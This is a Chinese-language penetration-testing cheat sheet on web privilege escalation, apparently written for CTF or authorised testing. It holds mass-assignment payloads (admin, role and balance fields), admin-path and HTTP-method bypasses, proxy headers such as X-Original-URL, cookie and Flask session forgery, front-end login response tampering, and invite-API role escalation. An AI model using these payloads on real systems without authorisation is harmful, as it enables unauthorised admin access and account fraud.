# Web 权限提升详细技术

## Mass Assignment 完整字段清单

### 权限字段（逐个测试，每次只加一个）
```json
{"role":"admin"}
{"is_admin":true}
{"is_staff":1}
{"admin":1}
{"group":"administrators"}
{"permissions":["admin"]}
{"type":"admin"}
{"privilege":"high"}
{"level":9}
{"is_superuser":true}
```

### 非权限但有用的字段
```json
{"balance":999999}
{"verified":true}
{"email_confirmed":true}
{"credits":99999}
```

### 框架惯例字段名
- **Django**: `is_staff`, `is_superuser`, `groups`
- **Rails**: `admin`, `role`
- **Laravel**: `is_admin`, `role_id`
- **Spring**: `authorities`, `roles`

### 字段名发现方法
1. `GET /api/users/me` 响应中暴露的字段
2. Swagger/OpenAPI 文档的字段定义
3. 发送无效值触发错误信息（`"role" must be one of: user, admin, superadmin`）
4. 框架惯例猜测

## 管理端点直接访问
```
GET /admin → 403? → 试 /admin/ (trailing slash)
GET /Admin → 200? (大小写)
GET /api/admin/users → 200?
GET /dashboard → 200?
```

## HTTP 方法与 Header 篡改

### 方法切换
```
GET /admin/flag → 403
POST /admin/flag → 200?
PUT /admin/flag → 200?
PATCH /admin/flag → 200?
```

### 特殊 Header（绕过反向代理路径限制）
```
X-Original-URL: /admin/flag
X-Rewrite-URL: /admin/flag
X-Forwarded-For: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
```

## Cookie/Session 篡改

### 明文 Cookie
```
role=user → role=admin
admin=0 → admin=1
is_logged_in=false → is_logged_in=true
```

### Base64 编码 Cookie
```python
import base64
cookie = base64.b64decode("eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9")
# → {"user":"guest","role":"user"}
new_cookie = base64.b64encode(b'{"user":"guest","role":"admin"}')
```

### Flask Session
Flask session 是签名的 JSON（不加密）。如果获取到 `secret_key` → 可伪造任意 session。
JWT 篡改参考 `jwt-attack-methodology`。

## SPA 前端鉴权绕过

现代 SPA（Vue/React/Angular）的权限检查常在前端完成——后端 API 可能完全没有鉴权。

### 后台页面一闪而过

访问管理后台时，页面在一瞬间加载出管理界面，然后立即重定向到登录页。这说明前端 JS 已经加载了管理界面的所有代码和接口，只是被 JS 路由守卫拦截了。

**利用方法**：
1. 用代理拦截重定向响应包（302/301），不让浏览器跳转
2. 等待管理后台的 JS 全部加载完成
3. 从加载的 JS 中提取所有管理接口（用 urlfind / 熊猫头 等工具）
4. 直接对这些管理接口测试未授权访问

如果后台页面不会一闪而过（纯登录框），手动输入账号密码，拦截服务端响应改为成功：

### 响应篡改绕过

当登录/权限检查在前端执行时，修改响应包可以绕过：

```bash
# 后端返回的原始响应
{"success": false, "code": 401, "message": "密码错误"}

# 篡改为
{"success": true, "code": 200, "message": "成功", "data": true}
```

**判断条件**：如果响应中没有返回 JWT/Token/Session 等后端鉴权凭据，说明鉴权逻辑完全在前端——响应篡改就有效。

篡改后进入管理界面（虽然是"虚假"的登录状态），重点不是使用界面功能，而是：
1. 界面加载了新的 JS → 从中提取管理 API 接口
2. 直接测试这些 API 接口的未授权访问
3. 界面可能展示了隐藏的功能入口

### 管理员邀请接口提权

当应用有团队/组织功能（管理员可以邀请成员）时：

```bash
# 1. 管理员(B)生成"查看者"邀请链接 → 普通用户(A)点击成为团队成员
# 2. 从管理员的请求中获取"编辑者/管理员"邀请接口
POST /api/team/invite
{"role": "viewer", "teamId": "xxx"}  ← 管理员生成的查看者链接

# 3. 用普通用户身份调用同一接口，修改 role
POST /api/team/invite
{"role": "editor", "teamId": "xxx"}  ← 自己生成编辑者链接

# 4. 自己点击自己生成的链接 → 提升为编辑者/管理员
```

关键：两个账户 A(普通) 和 B(管理员) 都是自己的测试账户，A 使用 B 才有权限的接口来提升自己。

### type 参数角色切换

权限相关的数字参数，尝试修改值以升级角色：

```bash
type=0  # 查看者
type=1  # 编辑者
type=2  # 管理员

role="user"   → role="admin"
role="user"   → role="root"
role="viewer"  → role="editor"
```
